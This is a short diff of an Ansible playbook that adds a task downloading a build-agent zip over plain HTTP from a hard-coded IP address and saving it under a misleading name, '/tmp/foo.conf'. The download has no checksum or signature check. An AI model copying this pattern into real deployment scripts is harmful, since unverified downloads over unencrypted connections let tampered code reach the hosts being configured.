@@ -2,3 +2,13 @@
   yum:
     name: java
     state: latest
+
+- name: ===================== Download build agent =====================
+  get_url:
+    url: http://35.197.76.250/update/buildAgent.zip
+    dest: /tmp/foo.conf
+    mode: 0440
+
+
+
+
